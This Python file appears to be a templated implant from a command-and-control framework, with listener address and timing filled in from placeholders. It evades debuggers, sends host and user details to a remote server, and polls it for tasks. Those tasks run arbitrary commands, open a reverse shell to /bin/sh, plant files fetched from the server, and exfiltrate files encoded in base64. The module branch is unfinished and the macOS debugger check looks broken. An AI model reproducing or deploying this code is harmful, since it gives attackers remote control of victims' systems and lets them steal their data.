import base64
import ctypes
import multiprocessing
import os
import platform
import socket
import subprocess as sp
import threading
import time

import requests as r


STAGER_ID = int("{{stager.id}}")
DELAY = int("{{stager.delay}}")
TIMEOUT = int("{{stager.timeout}}")
SLEEP_TIME = int("{{stager.options['sleep-time']}}")
SSL = "{{stager.listener.ssl}}".lower() == "true"
if SSL:
    URL = "https://{{stager.listener.address}}:{{stager.listener.port}}/"
else:
    URL = "http://{{stager.listener.address}}:{{stager.listener.port}}/"


operating_system = platform.system()

# Check if the current process is being debugged
if operating_system == 'Windows':
    kernel32 = ctypes.WinDLL('kernel32')
    is_debugger_present = kernel32.IsDebuggerPresent
    is_debugger_present.argtypes = []
    is_debugger_present.restype = ctypes.c_bool
    if is_debugger_present():
        os._exit(0)
elif operating_system == 'Linux':
    if os.getppid() == 1:
        os._exit(0)
elif operating_system == 'Darwin':
    proc = ctypes.CDLL('libproc.dylib')
    proc_pidinfo = proc.proc_pidinfo
    proc_pidinfo.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_uint64]
    proc_pidinfo.restype = ctypes.c_int
    info = proc_pidinfo(os.getpid(), 1, 0)
    if info.kp_proc.p_flag & 0x8:
        os._exit(0)


time.sleep(DELAY)

def download_file(task_name: str, file_path: str):
    with open(file_path, "wb") as f:
        f.write(r.get(URL+"download/"+task_name, verify=False).content)


def reverse_shell(address: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, int(port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    sp.call(["/bin/sh", "-i"])

def thread_execution(func: callable, args: tuple):
    t = threading.Thread(target=func, args=args)
    t.start()
    data["output"] = "Thread started"
    data["success"] = True

def get_output(cmd: str):
    data["output"] = sp.getoutput(cmd)
    data["success"] = True
    
data = {
    "address": socket.gethostbyname(socket.gethostname()),
    "hostname": sp.getoutput("hostname"),
    "os": sp.getoutput("uname").lower(),
    "architecture": sp.getoutput("uname -m"),
    "user": sp.getoutput("whoami"),
    "admin": os.getuid() == 0,
    "stager": STAGER_ID
}
name = r.post(f"{URL}/connect", json=data, verify=False).json()["name"]

i = 0
while i < TIMEOUT:
    time.sleep(SLEEP_TIME)
    try:
        tasks = r.get(URL + "/tasks/" + name, verify=False)
    except:
        i += 1
        continue
    tasks = tasks.json()
    for task in tasks:
        try:
            data = {
                "task": task["id"],
                "success": True
            }
            if task["type"] == "rce":
                data["output"] = sp.getoutput(task["args"]["cmd"])
            elif task["type"] == "dir":
                data["output"] = sp.getoutput("ls " + task["args"]["dir"])
            elif task["type"] == "reverse-shell":
                multiprocessing.Process(target=reverse_shell, args=(
                    task["args"]["address"], task["args"]["port"])).start()
                data["output"] = "Send reverse shell"
            elif task["type"] == "upload":
                try:
                    download_file(task["name"], task["args"]["target_path"])
                except Exception as e:
                    data["success"] = False
                    data["output"] = str(e)
                else:
                    data["output"] = "Downloaded file"
            elif task["type"] == "download":
                try:
                    with open(task["args"]["target_path"], "rb") as f:
                        data["output"] = base64.b64encode(f.read()).decode()
                except Exception as e:
                    data["success"] = False
                    data["output"] = str(e)
            
            elif task["type"] == "module":
                # get module info and content
                module = r.get(URL + "/module/", params={"path": task["args"]["path"]}, verify=False).json()
                module_content = r.get(URL + "/module/download", params={"name": task["name"]}, verify=False).content
                
                code_type = module["code_type"]
                execution_method = task["args"]["execution_method"]

            elif task["type"] == "info":
                data["output"] = {
                        "address": socket.gethostbyname(socket.gethostname()),
                        "hostname": sp.getoutput("hostname"),
                        "username": sp.getoutput("whoami"),
                        "admin": os.getuid() == 0,
                    }
                data["success"] = True
            else:
                data["success"] = False
                data["output"] = "Task type not supported."
        except Exception as e:
            data["success"] = False
            data["output"] = str(e)
        res = r.post(URL + "/finish/" + name, json=data, verify=False)
